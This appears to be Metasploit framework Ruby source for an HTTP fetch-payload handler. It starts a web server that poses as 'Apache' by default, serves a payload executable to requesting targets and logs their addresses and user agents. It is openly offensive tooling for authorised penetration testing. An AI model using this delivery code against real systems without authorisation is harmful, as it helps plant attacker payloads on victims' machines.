module Msf::Payload::Adapter::Fetch::Server::HTTP

  # This mixin supports only HTTP fetch handlers.

  def initialize(*args)
    super
    register_advanced_options(
      [
        Msf::OptString.new('FetchHttpServerName', [true, 'Fetch HTTP server name', 'Apache'])
      ]
    )
  end

  def fetch_protocol
    'HTTP'
  end

  def srvname
    datastore['FetchHttpServerName']
  end

  def add_resource(fetch_service, uri, srvexe)
    vprint_status("Adding resource #{uri}")
    if fetch_service.resources.include?(uri)
      # When we clean up, we need to leave resources alone, because we never added one.
      @delete_resource = false
      fail_with(Msf::Exploit::Failure::BadConfig, "Resource collision detected. Set FETCH_URIPATH to a different value to continue.")
    end
    fetch_service.add_resource(uri,
                               'Proc' => proc do |cli, req|
                                 on_request_uri(cli, req, srvexe)
                               end,
                               'VirtualDirectory' => true)
  rescue  ::Exception => e
    # When we clean up, we need to leave resources alone, because we never added one.
    @delete_resource = false
    fail_with(Msf::Exploit::Failure::Unknown, "Failed to add resource\n#{e}")
  end

  def cleanup_http_fetch_service(fetch_service, delete_resource)
    escaped_srvuri = ('/' + srvuri).gsub('//', '/')
    if fetch_service.resources.include?(escaped_srvuri) && delete_resource
      fetch_service.remove_resource(escaped_srvuri)
    end
    fetch_service.deref
  end

  def start_http_fetch_handler(srvname, srvexe, ssl=false, ssl_cert=nil, ssl_compression=nil, ssl_cipher=nil, ssl_version=nil)
    # this looks a bit funny because I converted it to use an instance variable so that if we crash in the
    # middle and don't return a value, we still have the right fetch_service to clean up.
    escaped_srvuri = ('/' + srvuri).gsub('//', '/')
    fetch_service = start_http_server(ssl, ssl_cert, ssl_compression, ssl_cipher, ssl_version)
    if fetch_service.nil?
      cleanup_handler
      fail_with(Msf::Exploit::Failure::BadConfig, "Fetch handler failed to start on #{fetch_bindnetloc}")
    end
    vprint_status("#{fetch_protocol} server started")
    fetch_service.server_name = srvname
    add_resource(fetch_service, escaped_srvuri, srvexe)
    fetch_service
  end

  def on_request_uri(cli, request, srvexe)
    client = cli.peerhost
    vprint_status("Client #{client} requested #{request.uri}")
    if (user_agent = request.headers['User-Agent'])
      client += " (#{user_agent})"
    end
    vprint_status("Sending payload to #{client}")
    cli.send_response(payload_response(srvexe))
  end

  def payload_response(srvexe)
    res = Rex::Proto::Http::Response.new(200, 'OK', Rex::Proto::Http::DefaultProtocol)
    res['Content-Type'] = 'text/html'
    res.body = srvexe.to_s.unpack('C*').pack('C*')
    res
  end

  def start_http_server(ssl=false, ssl_cert=nil, ssl_compression=nil, ssl_cipher=nil, ssl_version=nil)
    begin
      fetch_service = Rex::ServiceManager.start(
        Rex::Proto::Http::Server,
        fetch_bindport, fetch_bindhost, ssl,
        {
          'Msf' => framework,
          'MsfExploit' => self
        },
        _determine_server_comm(fetch_bindhost),
        ssl_cert,
        ssl_compression,
        ssl_cipher,
        ssl_version
      )
    rescue Exception => e
      cleanup_handler
      fail_with(Msf::Exploit::Failure::BadConfig, "Fetch handler failed to start on #{fetch_bindnetloc}\n#{e}")
    end
    vprint_status("Fetch handler listening on #{fetch_bindnetloc}")
    fetch_service
  end
end
